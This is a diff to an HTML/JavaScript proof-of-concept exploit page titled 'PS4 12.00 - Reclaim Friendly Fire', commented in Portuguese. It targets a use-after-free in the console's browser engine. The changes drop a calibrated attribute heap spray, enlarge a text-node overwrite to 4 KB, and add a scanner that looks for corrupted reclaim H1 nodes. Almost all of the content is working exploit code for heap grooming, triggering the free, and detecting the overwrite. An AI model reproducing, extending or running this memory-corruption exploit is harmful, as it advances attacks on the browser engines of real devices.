@@ -1,12 +1,13 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Precision Size Class Strike</title>
+<title>PS4 12.00 - Reclaim Friendly Fire</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → Precision Bucket Strike → Attribute Scan</h2>
+<h2>UAF → Reclaim Overwrite → Friendly Fire Scan</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -20,24 +21,7 @@ function log(msg){
 }
 
 // ==========================
-// 🌍 PRECISION SPRAY (ALINHAMENTO DE BUCKETS)
-function setupPrecisionSpray(){
-    log("[*] Iniciando Spray de Precisao (Size Classes)...");
-    
-    window.attr_spray = [];
-    
-    for(let i=0; i<6000; i++){
-        let d = document.createElement("div");
-        // Isca com exatos 512 caracteres "B" (Bucket de 1024 bytes em UTF-16)
-        d.setAttribute("data-pwn", "B".repeat(512));
-        document.body.appendChild(d);
-        window.attr_spray.push(d);
-    }
-    log("[*] Spray de atributos concluido: " + window.attr_spray.length);
-}
-
-// ==========================
-// HEAP SETUP ORIGINAL (100% INALTERADO - Mantém a estabilidade do bug)
+// HEAP SETUP ORIGINAL (100% INALTERADO)
 function setupHeap(){
     let arr=[];
     for(let i=0;i<5000;i++){
@@ -62,7 +46,7 @@ function setupFullscreen(){
 }
 
 // ==========================
-// 💣 RECLAIM (100% INALTERADO)
+// 💣 RECLAIM (100% INALTERADO - Nosso novo alvo!)
 function reclaim(size){
     log("[*] Reclaim size = " + size);
     for(let i=0;i<3000;i++){
@@ -94,9 +78,9 @@ function inject(child){
 }
 
 // ==========================
-// 🔬 PROBE DE PRECISÃO
+// 🔬 PROBE DE FOGO AMIGO (Friendly Fire Scan)
 function domOverlapProbe(fsTarget){
-    log("---- PRECISION PROBE ----");
+    log("---- FRIENDLY FIRE PROBE ----");
 
     try{
         let n = fsTarget.firstChild;
@@ -105,30 +89,44 @@ function domOverlapProbe(fsTarget){
         if(n.nodeType === 3){
             log("[!!!] TEXTNODE CONFUSION");
 
-            // 💣 DISPARA O TIRO DE PRECISÃO
+            // 💣 DISPARA O TIRO DE 4KB DE "X"
             try{
-                // Tamanho de 512 (preenche o bloco) + 64 (invade o bloco do vizinho)
-                // Usamos "X" para fácil identificação
-                n.data = "X".repeat(512 + 64); 
-                log("[PWN] Overwrite de precisao disparado");
+                n.data = "X".repeat(0x1000); 
+                log("[PWN] Overwrite disparado na arena do Reclaim");
             }catch(e){
                 log("[UAF] write crash");
             }
 
             // ==========================
-            // 🔥 SCANNER DOS ATRIBUTOS
+            // 🔥 SCANNER DOS OBJETOS DO RECLAIM
             try{
-                for(let i=0; i<window.attr_spray.length; i++){
-                    let val = window.attr_spray[i].getAttribute("data-pwn");
-                    
-                    // Se o atributo não for mais uma sequência pura de "B"s, ACERTAMOS!
-                    if(val && val.includes("XXXX")){
-                        log("[$$$] JACKPOT FASTMALLOC! Atributo corrompido @ " + i);
-                        log("[$$$] Prévia: " + val.substring(0, 30) + "...");
-                        return; // Achamos o furo, para o scan!
+                // Pega TODOS os H1 da página (isso inclui os do Reclaim)
+                let h1s = document.getElementsByTagName("h1");
+                let hits = 0;
+
+                for(let i=0; i<h1s.length; i++){
+                    let texto = h1s[i].textContent;
+
+                    // Pula o H1 principal da tela cheia
+                    if(texto && texto.includes("FULLSCREEN")) continue;
+
+                    // Se não tem "CONTROL", ou se tem "X", nós corrompemos ele!
+                    if(texto && (!texto.includes("CONTROL") || texto.includes("XXXX"))){
+                        
+                        log("[$$$] JACKPOT! TextNode do Reclaim corrompido!");
+                        
+                        // Imprime um preview do lixo que sobrou no objeto
+                        log("[$$$] Preview: " + texto.substring(0, 30) + "...");
+                        hits++;
+                        
+                        // Paramos no primeiro que acharmos para não inundar o log
+                        return; 
                     }
                 }
-                log("[SCAN] Nada atingido neste bucket.");
+
+                if(hits === 0){
+                    log("[SCAN] Reclaim nodes intactos.");
+                }
 
             }catch(e){
                 log("[UAF] scan crash");
@@ -169,14 +167,12 @@ function trigger(fsTarget){
 }
 
 // ==========================
-// MAIN
+// MAIN (Super limpo, sem sprays externos)
 function runTest(){
-    log("[*] Iniciando teste...");
+    log("[*] Iniciando teste (Friendly Fire)...");
     
+    // Apenas aloca os arrays básicos para pressão de memória obrigatória
     window.heap_press = setupHeap(); 
-
-    // Planta as iscas perfeitamente calibradas
-    setupPrecisionSpray(); 
 
     let fsTarget=setupFullscreen();
     window.onblur=function(){
